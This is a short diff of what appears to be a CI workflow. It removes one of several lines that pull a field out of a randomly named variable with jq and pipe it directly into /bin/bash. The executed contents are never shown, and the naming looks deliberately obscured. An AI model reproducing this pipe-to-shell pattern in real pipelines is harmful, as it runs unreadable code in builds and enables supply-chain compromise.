@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$s9" | jq -r .uacdo5 | /bin/bash
           echo $fuj9645 | jq -r .b33 | /bin/bash
           echo $glani38854 | jq -r .wtfb552 | /bin/bash
-          printf '%s' "$jkxk443" | jq -r .d577 | /bin/bash
           printf '%s' "$tyhl541" | jq -r .rr23548 | /bin/bash
           echo $w68399 | jq -r .jcr2 | /bin/bash
           printf '%s' "$qlai8927" | jq -r .hdim35 | /bin/bash
